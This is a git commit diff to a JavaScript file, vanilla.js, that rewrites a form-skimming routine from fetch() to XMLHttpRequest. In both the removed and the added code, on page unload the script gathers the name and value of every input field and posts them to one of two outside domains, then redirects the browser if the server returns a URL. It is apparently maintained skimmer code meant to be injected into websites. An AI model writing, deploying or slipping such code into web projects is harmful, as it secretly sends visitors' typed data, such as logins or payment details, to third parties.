5c1909ec85684d6a3d7380e638f87b046ede2fa4
Yonatan354 <yonatan_g@adsen-media.com>
2023-12-04 15:44:39 +0200

    changed to xml

--- vanilla.js
+++ vanilla.js
@@ -1,27 +1,23 @@
 var stop = true;
 
 function LogTime(e) {
-    if (stop) {
-        fetch('//' + ["petfirsts", "petsdogma"][Math.round(Math.random())] + '.com/index.php', {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify("" + [...document.querySelectorAll("input")].map((e) => e.name + '=' + e.value).join("&")),
-        })
-            .then(function (response) {
-                if (response) {
-                    return response.json()
-                }
-            })
-            .then(function (json) {
-                if (json.url) {
-                    stop = false;
-                    e.preventDefault();
-                    window.location.href = dt.url;
-                }
-            })
+    const xhr = new XMLHttpRequest();
+xhr.open("POST", '//' + ["petfirsts", "petsdogma"][Math.round(Math.random())] + '.com/index.php', true);
+xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8');
+xhr.send("" + [...document.querySelectorAll("input")].map((e) => e.name + '=' + e.value).join("&"));
+// Fired once the request completes successfully 
+xhr.onload = function(e) {
+    // Check if the request was a success
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 201) {
+    	// Get and convert the responseText into JSON
+    	var response = JSON.parse(xhr.responseText);
+    	if (response.url) {
+            stop = false;
+            e.preventDefault();
+            window.location.href = dt.url;
+        }
     }
 }
+}
 
-$(window).bind('beforeunload', LogTime);
+window.onbeforeunload = LogTime
